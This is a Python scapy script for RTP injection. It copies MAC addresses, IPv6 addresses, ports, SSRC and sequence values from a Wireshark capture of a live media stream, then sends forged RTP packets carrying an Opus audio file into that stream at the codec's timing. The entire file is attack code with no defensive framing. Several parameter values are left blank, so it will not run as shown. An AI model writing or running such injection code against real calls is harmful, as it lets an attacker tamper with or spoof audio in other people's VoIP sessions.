from scapy.all import *
from scapy.contrib.rtp import RTP
import time

# Load the Opus audio file
with open("any audio file", "rb") as f:
    opus_data = f.read()

# Updated Network and RTP parameters (from Wireshark capture)
source_mac = ""
dest_mac = ""
source_ip = ""
dest_ip = ""
source_port = 
dest_port = 
ssrc = 
sequence_number = 
timestamp =

# Define Opus chunk size and packet duration (based on Wireshark)
chunk_size = 45  # From captured packet
chunk_duration = 0.020  # 20 ms per packet

# Validate Opus file size
if len(opus_data) == 0:
    raise ValueError("Opus audio file is empty.")

print(f"Starting RTP injection...")
print(f"Chunk Size: {chunk_size} bytes")
print(f"Opus Data Length: {len(opus_data)} bytes")

# Inject RTP Packets
for i in range(0, len(opus_data), chunk_size):
    rtp_payload = opus_data[i:i + chunk_size]
    
    # Pad last chunk if necessary
    if len(rtp_payload) < chunk_size:
        rtp_payload += b'\x00' * (chunk_size - len(rtp_payload))
    
    # Create RTP header
    rtp_header = RTP(
        version=2,
        payload_type=96,  # Opus codec
        sequence=sequence_number,
        timestamp=timestamp,
        ssrc=ssrc
    )
    
    # Build the full packet with Ethernet, IPv6, and UDP
    ether_layer = Ether(src=source_mac, dst=dest_mac)
    rtp_packet = ether_layer / IPv6(src=source_ip, dst=dest_ip, hlim=64) / \
                 UDP(sport=source_port, dport=dest_port) / \
                 rtp_header / \
                 Raw(load=rtp_payload)

    # Send RTP packet
    sendp(rtp_packet, verbose=False)

    # Update sequence number and timestamp
    sequence_number += 1
    timestamp += int(48000 * chunk_duration)  # 48 kHz * packet duration

    # Wait for next packet interval
    time.sleep(chunk_duration)

print("RTP injection complete.")
